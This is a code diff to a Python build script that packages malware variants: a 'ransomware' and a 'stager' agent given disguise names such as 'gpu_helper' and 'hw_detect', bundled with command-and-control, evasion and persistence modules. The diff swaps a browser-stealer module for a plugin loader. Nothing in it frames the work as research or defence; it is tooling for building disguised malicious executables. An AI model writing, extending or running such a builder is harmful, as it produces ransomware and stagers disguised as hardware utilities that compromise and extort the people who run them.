@@ -98,7 +98,7 @@ def build_variant(
 
     lib_dest = os.path.join(build_dir, "lib")
     os.makedirs(lib_dest, exist_ok=True)
-    for f in ['__init__.py', 'c2_client.py', 'crypto_utils.py', 'browser_stealer.py']:
+    for f in ['__init__.py', 'c2_client.py', 'plugin_loader.py']:
         shutil.copy2(os.path.join(LIB_DIR, f), os.path.join(lib_dest, f))
     for base_name in ['evasion', 'persistence']:
         plat_src = os.path.join(LIB_DIR, f"{base_name}_{plat_suffix}.py")
@@ -113,7 +113,7 @@ def build_variant(
     excludes.extend(exclude_modules)
 
     all_hidden = set(hidden_imports) | {
-        'lib.persistence', 'lib.c2_client', 'lib.crypto_utils', 'lib.evasion',
+        'lib.persistence', 'lib.c2_client', 'lib.plugin_loader', 'lib.evasion',
     }
     himports = "[" + ", ".join(f"'{h}'" for h in sorted(all_hidden)) + "]"
 
@@ -222,11 +222,9 @@ def build_all_variants():
 
     variants = [
         ("installer", "ransomware", "gpu_helper",
-         ['Crypto', 'Crypto.PublicKey', 'Crypto.Cipher',
-          'cryptography'], []),
-        ("scanner", "stager", "hw_detect", ['cryptography'],
-         ['Crypto', 'Crypto.PublicKey', 'Crypto.Cipher',
-          'tqdm']),
+         ['cryptography', 'lib.plugin_loader'], []),
+        ("scanner", "stager", "hw_detect",
+         ['cryptography', 'lib.plugin_loader'], []),
     ]
 
     for src_name, agent_base, out_name, himports, exmods in variants:
